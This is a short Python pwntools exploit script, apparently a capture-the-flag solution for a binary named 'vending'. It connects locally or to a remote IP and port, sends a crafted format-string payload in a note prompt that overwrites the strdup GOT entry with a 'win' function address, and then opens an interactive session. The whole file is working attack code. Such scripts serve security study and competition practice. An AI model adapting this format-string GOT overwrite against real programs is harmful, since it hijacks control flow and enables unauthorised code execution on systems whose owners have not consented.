#!/usr/bin/env python3

from pwn import *

exe = ELF("./vending_patched")
context.binary = exe

STRDUP_GOT = 0x404050
WIN = 0x4011C6


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("109.123.232.54", 1343)

    return r


def got_payload():
    # note[0:8] is printf argument 6, so note[64:72] is argument 14.
    # Write the full 8-byte GOT entry so this also works after strdup
    # has already been resolved.
    #   0x404054 = 0x0000, 0x404056 = 0x0000  (high dword)
    #   0x404052 = 0x0040, 0x404050 = 0x11c6  (low dword -> 0x4011c6)
    fmt = b"%14$hn%15$hn%64c%16$hn%4486c%17$hn".ljust(64, b"P")
    return (
        fmt
        + p64(STRDUP_GOT + 4)
        + p64(STRDUP_GOT + 6)
        + p64(STRDUP_GOT + 2)
        + p64(STRDUP_GOT)
    )


def main():
    r = conn()

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Snack name: ", b"ramen")
    r.sendlineafter(b"Any note? ", got_payload())

    r.interactive()


if __name__ == "__main__":
    main()
